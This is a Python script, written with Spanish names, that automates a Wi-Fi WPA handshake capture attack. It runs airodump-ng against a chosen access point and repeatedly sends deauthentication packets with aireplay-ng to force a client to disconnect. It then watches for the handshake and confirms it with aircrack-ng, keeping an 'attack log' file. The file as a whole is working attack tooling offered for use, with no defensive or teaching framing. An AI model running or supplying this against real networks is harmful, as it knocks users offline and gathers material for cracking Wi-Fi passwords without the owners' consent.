import subprocess
import time
import os
import glob
import pty
import select
import tempfile

ARCHIVO_LOG = "log_ataque.txt"


def _registrar_log(texto: str):
    with open(ARCHIVO_LOG, "a") as f:
        f.write(texto)
        if not texto.endswith("\n"):
            f.write("\n")


def iniciar_captura_dirigida(interfaz_monitor: str, bssid: str, canal: str, archivo_salida: str = "captura"):
    for archivo_viejo in glob.glob(f"{archivo_salida}-*"):
        os.remove(archivo_viejo)
    comando = ["sudo", "airodump-ng", interfaz_monitor, "--bssid", bssid, "-c", canal, "-w", archivo_salida]
    maestro, esclavo = pty.openpty()
    proceso = subprocess.Popen(comando, stdout=esclavo, stderr=esclavo, stdin=esclavo, close_fds=True)
    os.close(esclavo)
    return proceso, maestro  # ahora también devolvemos "maestro" para poder leer la pantalla


def desautenticar(interfaz_monitor: str, bssid: str, mac_cliente: str, cantidad_paquetes: int = 15):
    comando = ["sudo", "aireplay-ng", "-0", str(cantidad_paquetes), "-a", bssid, "-c", mac_cliente, interfaz_monitor]
    resultado = subprocess.run(comando, capture_output=True, text=True)
    salida = resultado.stdout + resultado.stderr
    print(salida)
    _registrar_log(f"--- desautenticar() ---\n{salida}")


def _leer_pantalla_disponible(maestro: int) -> str:
    # Lee lo que airodump-ng haya escrito en su "pantalla" (el pty), sin bloquear.
    texto = ""
    while True:
        listo, _, _ = select.select([maestro], [], [], 0)
        if not listo:
            break
        try:
            fragmento = os.read(maestro, 4096)
        except OSError:
            break
        if not fragmento:
            break
        texto += fragmento.decode(errors="ignore")
    return texto


def esperar_handshake(archivo_cap: str, bssid: str, interfaz_monitor: str, mac_cliente: str, maestro_captura: int,
                       intentos_maximos: int = 15, espera_segundos: int = 5, reenviar_cada: int = 4) -> bool:

    diccionario_temporal = tempfile.NamedTemporaryFile(mode="w", suffix=".txt", delete=False)
    diccionario_temporal.write("clave_de_prueba\n")
    diccionario_temporal.close()

    pantalla_acumulada = ""

    try:
        for intento in range(intentos_maximos):
            if intento % reenviar_cada == 0:
                desautenticar(interfaz_monitor, bssid, mac_cliente)

            # Igual que cuando lo haces a mano: miramos la pantalla de airodump-ng
            pantalla_acumulada += _leer_pantalla_disponible(maestro_captura)
            if "WPA handshake" in pantalla_acumulada:
                print("¡Handshake capturado! (confirmado en la pantalla de airodump-ng)")
                _registrar_log("Handshake detectado en la pantalla de airodump-ng.")
                return True

            # Respaldo: seguimos revisando también con aircrack-ng, por si acaso
            resultado = subprocess.run(
                ["aircrack-ng", "-b", bssid, "-w", diccionario_temporal.name, archivo_cap],
                capture_output=True,
                text=True
            )
            salida = resultado.stdout
            if "Passphrase not in dictionary" in salida or "KEY FOUND" in salida:
                print("¡Handshake capturado! (confirmado por aircrack-ng)")
                _registrar_log("Handshake capturado (via aircrack-ng).")
                return True

            print(f"Intento {intento + 1}/{intentos_maximos}: aún no hay handshake, esperando...")
            time.sleep(espera_segundos)
        _registrar_log("No se logró capturar el handshake tras todos los intentos.")
        return False
    finally:
        os.remove(diccionario_temporal.name)